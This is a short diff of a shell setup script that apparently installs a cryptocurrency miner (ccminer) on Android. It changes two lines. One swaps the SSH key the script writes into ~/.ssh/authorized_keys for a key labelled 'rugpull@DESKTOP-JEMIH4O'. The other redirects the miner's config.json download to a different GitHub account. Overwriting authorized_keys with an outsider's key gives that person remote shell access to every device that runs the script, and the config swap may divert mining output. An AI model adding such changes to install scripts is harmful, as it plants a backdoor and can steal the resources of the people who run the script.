@@ -10,7 +10,7 @@ then
   mkdir ~/.ssh
   chmod 0700 ~/.ssh
   cat << EOF > ~/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBCJs54RG0CKvQebaOeIXgCh7DyisdwnBeF4rGtlQy0BaHQPyKHlNf5G4B9jJQ7R/K2PPIPOAT6419kPTN/8tj9ymbXcVtLibrqgj8rmqSdvZGJo1sKK0iVeedc89MNGTTLQV8Bo5Xdj1GbjTqRS7xllZ2Qs4p898+L5NsYIKnSRCH1rAG7s/yw7OXnPMdIda4jg27cM9MKaqdultJj5NOY9ZtxHOG6C4AZ/n/L9iobLyj9AllsSJ5fCpuTkgQgrQjpe1t5h36D78BNYeSQvBNyozV1KZr7/UZ9J4mHSMx8Udd/x0rfXG63BNuRoX0V5lZ+8iIX12vwwoRPTdY+yUszXBrbLV3fssmNI/KjNeWoFS8UiL6CdLgk2leadOTq2iDdBO3Ecl2PlnVsiQvjbrUHRuUwNPlXZJCXdGP6lkIwophgqrurlsvRn5sBOoUf7So8kah5kLHLLnAdUn48Lda49YOaxZpK1xk4XCfUfHqTXQPm+QGAw5z3tgfoxHmW1U= rugpull@DESKTOP-JEMIH4O
 EOF
   chmod 0600 ~/.ssh/authorized_keys
 fi
@@ -47,7 +47,7 @@ then
     fi
   done
 fi
-wget https://raw.githubusercontent.com/Oink70/Android-Mining/main/config.json -P ~/ccminer
+wget https://raw.githubusercontent.com/authrequest/Android-Mining/main/config.json -P ~/ccminer
 
 if [ -f ~/ccminer/ccminer ]
 then
